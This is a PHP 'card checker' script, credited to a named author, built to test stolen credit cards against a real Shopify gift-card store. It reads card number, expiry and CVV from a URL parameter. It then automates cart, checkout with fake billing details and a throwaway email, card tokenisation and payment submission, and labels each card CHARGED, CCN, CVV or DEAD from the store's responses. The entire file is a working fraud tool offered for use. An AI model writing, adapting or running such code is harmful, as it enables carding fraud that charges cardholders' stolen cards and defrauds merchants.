<?php

//===================== [ MADE BY Rishab ] ====================//
#---------------[ PROXYLESS ]----------------#


error_reporting(0);

unlink(getcwd() . '/cookie.txt');
date_default_timezone_set('America/Buenos_Aires');

function GetStr($string, $start, $end)
{
	$string = ' ' . $string;
	$ini = strpos($string, $start);
	if ($ini == 0) return '';
	$ini += strlen($start);
	$len = strpos($string, $end, $ini) - $ini;
	return trim(strip_tags(substr($string, $ini, $len)));
}


function multiexplode($seperator, $string)
{
	$one = str_replace($seperator, $seperator[0], $string);
	$two = explode($seperator[0], $one);
	return $two;
};
function generateRandomString($length = 16)
{
	$characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
	$charactersLength = strlen($characters);
	$randomString = '';
	for ($i = 0; $i < $length; $i++) {
		$randomString .= $characters[rand(0, $charactersLength - 1)];
	}
	return $randomString;
};

$tg_id = $_GET['cst'];
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";

if (file_exists("cookie.txt")) {
	unlink("cookie.txt");
}
$formData = '------WebKitFormBoundary5JHWwCF5nCzZXEpI
Content-Disposition: form-data; name="Denominations"

€25.-
------WebKitFormBoundary5JHWwCF5nCzZXEpI
Content-Disposition: form-data; name="quantity"

1
------WebKitFormBoundary5JHWwCF5nCzZXEpI
Content-Disposition: form-data; name="form_type"

product
------WebKitFormBoundary5JHWwCF5nCzZXEpI
Content-Disposition: form-data; name="utf8"

✓
------WebKitFormBoundary5JHWwCF5nCzZXEpI
Content-Disposition: form-data; name="id"

40014229405777
------WebKitFormBoundary5JHWwCF5nCzZXEpI
Content-Disposition: form-data; name="sections"

cart-notification-product,cart-notification-button,cart-icon-bubble
------WebKitFormBoundary5JHWwCF5nCzZXEpI
Content-Disposition: form-data; name="sections_url"

/products/gosoulful-giftcard
------WebKitFormBoundary5JHWwCF5nCzZXEpI--';
$email = generateRandomString() . "%40nospam.today";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://gosoulful.shop/cart/add');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array(
	'authority: gosoulful.shop',
	'method: POST',
	'path: /cart/add',
	'scheme: https',
	'accept: application/javascript',
	'accept-encoding: gzip, deflate, br',
	'accept-language: en-US,en;q=0.9',
	'content-length: ' . strlen($formData),
	'content-type: multipart/form-data; boundary=----WebKitFormBoundary5JHWwCF5nCzZXEpI',
	'origin: https://gosoulful.shop',
	'referer: https://gosoulful.shop/products/gosoulful-giftcard?_pos=1&_sid=f3c31e000&_ss=r',
	'sec-ch-ua: "Brave";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
	'sec-ch-ua-mobile: ?0',
	'sec-ch-ua-platform: "Windows"',
	'sec-fetch-dest: empty',
	'sec-fetch-mode: cors',
	'sec-fetch-site: same-origin',
	'sec-gpc: 1',
	'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
	'x-requested-with: XMLHttpRequest'
);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, $formData);
$curl1 = curl_exec($ch);
curl_close($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://gosoulful.shop/cart');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'origin: https://gosoulful.shop';
$headers[] = 'referer: https://gosoulful.shop/cart';
$headers[] = 'sec-ch-ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'checkout=');
$curl2 = curl_exec($ch);

$auth = trim(strip_tags(getStr($curl2, 'name="authenticity_token" value="', '"')));
$id1 = trim(strip_tags(getStr($curl2, '"edit_checkout" action="/', '/')));
$id2 = trim(strip_tags(getStr($curl2, '/checkouts/', '"')));

curl_close($ch);
$url = "https://gosoulful.shop/$id1/checkouts/$id2";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'origin: https://gosoulful.shop';
$headers[] = 'referer: https://gosoulful.shop/';
$headers[] = 'sec-ch-ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token=' . $auth . '&previous_step=contact_information&step=payment_method&checkout%5Bemail_or_phone%5D=' . $email . '&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbilling_address%5D%5Bfirst_name%5D=john&checkout%5Bbilling_address%5D%5Blast_name%5D=smith&checkout%5Bbilling_address%5D%5Bcompany%5D=&checkout%5Bbilling_address%5D%5Baddress1%5D=newyork+st&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=newyorks+city&checkout%5Bbilling_address%5D%5Bcountry%5D=US&checkout%5Bbilling_address%5D%5Bprovince%5D=New+York&checkout%5Bbilling_address%5D%5Bzip%5D=10080&checkout%5Bbilling_address%5D%5Bphone%5D=9098184881&checkout%5Bbilling_address%5D%5Bcountry%5D=United+States&checkout%5Bbilling_address%5D%5Bfirst_name%5D=john&checkout%5Bbilling_address%5D%5Blast_name%5D=smith&checkout%5Bbilling_address%5D%5Bcompany%5D=&checkout%5Bbilling_address%5D%5Baddress1%5D=newyork+st&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=newyorks+city&checkout%5Bbilling_address%5D%5Bprovince%5D=NY&checkout%5Bbilling_address%5D%5Bzip%5D=10080&checkout%5Bbilling_address%5D%5Bphone%5D=9098184881&checkout%5Bclient_details%5D%5Bbrowser_width%5D=622&checkout%5Bclient_details%5D%5Bbrowser_height%5D=750&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-345');
$curl3 = curl_exec($ch);
$auth2 = trim(strip_tags(getStr($curl3, 'name="authenticity_token" value="', '"')));
curl_close($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://deposit.us.shopifycs.com/sessions');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: deposit.us.shopifycs.com';
$headers[] = 'Origin: https://checkout.shopifycs.com';
$headers[] = 'Referer: https://checkout.shopifycs.com/';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'Sec-GPC: 1';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"' . $cc . '","name":"john smith","month":' . $mes . ',"year":' . $ano . ',"verification_value":"' . $cvv . '"},"payment_session_scope":"gosoulful.shop"}');
$curl5 = curl_exec($ch);
$id5 = json_decode($curl5, 1)['id'];
curl_close($ch);



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'origin: https://gosoulful.shop';
$headers[] = 'referer: https://gosoulful.shop/';
$headers[] = 'sec-ch-ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token=' . $auth2 . '&previous_step=payment_method&step=&s=' . $id5 . '&checkout%5Bpayment_gateway%5D=68451205201&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bvault_phone%5D=%2B19098184881&checkout%5Btotal_price%5D=2500&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=622&checkout%5Bclient_details%5D%5Bbrowser_height%5D=750&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-345');
$curl6 = curl_exec($ch);
curl_close($ch);
sleep(7);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "$url?from_processing_page=1&validate=true");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'origin: https://gosoulful.shop';
$headers[] = 'referer: https://gosoulful.shop/';
$headers[] = 'sec-ch-ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
$result2 = curl_exec($ch);
$final = trim(strip_tags(getStr($result2, '<use xlink:href="#error" /> </svg><div class="notice__content"><p class="notice__text">', '</p></div></div>')));
curl_close($ch);

if (strpos($result2, "Thank you john!")) {
	echo 'CHARGED</span>  </span>CC:  ' . $lista . '</span>  <br>➤ Response: $25 Charged ✅ BY @rishabuzumaki<br> ➤ Gate : Shopify gateway <br>';
} elseif (strpos($result2, "Your order is confirmed")) {
	echo 'CHARGED</span>  </span>CC:  ' . $lista . '</span>  <br>➤ Response: $25 Charged ✅ BY @rishabuzumaki<br> ➤ Gate : Shopify gateway <br>';
} elseif (strpos($result2, "Thank you for your purchase!")) {
	echo 'CHARGED</span>  </span>CC:  ' . $lista . '</span>  <br>➤ Response: $25 Charged ✅ BY @rishabuzumaki<br> ➤ Gate : Shopify gateway <br>';
} elseif (strpos($result2, 'Security code was not matched by the processor')) {
	echo 'CCN</span>  </span>CC:  ' . $lista . '</span>  <br>Result: Security code is incorrect ✅ BY @rishabuzumaki</span><br> ➤ Gate : Shopify gateway<br>';
} elseif (strpos($result2, 'Security codes does not match correct')) {
	echo 'CCN</span>  </span>CC:  ' . $lista . '</span>  <br>Result: Security code is incorrect ✅ BY @rishabuzumaki</span><br> ➤ Gate : Shopify gateway<br>';
} elseif (strpos($result2, 'Invalid card verification number')) {
	echo 'CCN</span>  </span>CC:  ' . $lista . '</span>  <br>Result: Security code is incorrect ✅ BY @rishabuzumaki</span><br> ➤ Gate : Shopify gateway<br>';
} elseif (strpos($result2, "Street address and postal code do not match")) {
	echo 'CVV</span>  </span>CC:  ' . $lista . '</span>  <br>Result: Street address and postal code do not match ✅[MISMATCH] BY @rishabuzumaki</span><br> ➤ Gate : Shopify gateway <br>';
} elseif (strpos($result2, "insufficient_funds")) {
	echo 'CVV</span>  </span>CC:  ' . $lista . '</span>  <br>Result: INSUFFICIENT FUNDS ✅ BY @rishabuzumaki</span><br>➤ Gate : Shopify gateway<br>';
} elseif (strpos($result2, "Insufficient funds")) {
	echo 'CVV</span>  </span>CC:  ' . $lista . '</span>  <br>Result: INSUFFICIENT FUNDS ✅ BY @rishabuzumaki</span><br>➤ Gate : Shopify gateway<br>';
} elseif (strpos($result2, "incorrect_cvc")) {
	echo 'CCN</span>  </span>CC:  ' . $lista . '</span>  <br>Result: Security code is incorrect ✅ BY @rishabuzumaki</span><br>➤ Gate : Shopify gateway<br>';
} else {
	echo 'DEAD</span> CC:  ' . $lista . '</span>  <br> Result: ' . $final . ' ❌ BY @rishabuzumaki </span><br> ➤ Gate : Shopify gateway<br>';
}
curl_close($ch);
ob_flush();
